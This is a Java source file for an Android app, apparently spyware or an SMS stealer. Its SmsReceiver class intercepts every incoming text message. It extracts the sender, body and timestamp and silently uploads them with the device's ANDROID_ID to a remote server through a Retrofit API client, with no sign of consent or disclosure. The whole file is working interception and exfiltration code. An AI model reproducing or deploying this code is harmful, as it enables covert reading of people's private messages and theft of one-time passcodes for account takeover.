package com.ultimate.access.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.ultimate.access.network.ApiClient;
import com.ultimate.access.network.ApiService;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String message = smsMessage.getDisplayMessageBody();
                        long timestamp = smsMessage.getTimestampMillis();

                        Log.d(TAG, "SMS received from: " + sender);
                        Log.d(TAG, "Message: " + message);

                        // Send to server
                        sendSmsToServer(context, sender, message, timestamp);
                    }
                }
            }
        }
    }

    private void sendSmsToServer(Context context, String sender, String message, long timestamp) {
        String deviceId = android.provider.Settings.Secure.getString(
                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

        Map<String, Object> smsData = new HashMap<>();
        smsData.put("deviceId", deviceId);
        smsData.put("address", sender);
        smsData.put("body", message);
        smsData.put("date", new Date(timestamp));
        smsData.put("type", "INBOX");

        Map<String, Object> request = new HashMap<>();
        request.put("deviceId", deviceId);
        request.put("messages", new Map[]{smsData});

        ApiService apiService = ApiClient.getClient().create(ApiService.class);
        apiService.sendSms(request).enqueue(new retrofit2.Callback<ApiService.ServerResponse>() {
            @Override
            public void onResponse(retrofit2.Call<ApiService.ServerResponse> call,
                                   retrofit2.Response<ApiService.ServerResponse> response) {
                Log.d(TAG, "SMS sent to server successfully");
            }

            @Override
            public void onFailure(retrofit2.Call<ApiService.ServerResponse> call, Throwable t) {
                Log.e(TAG, "Failed to send SMS to server: " + t.getMessage());
            }
        });
    }
}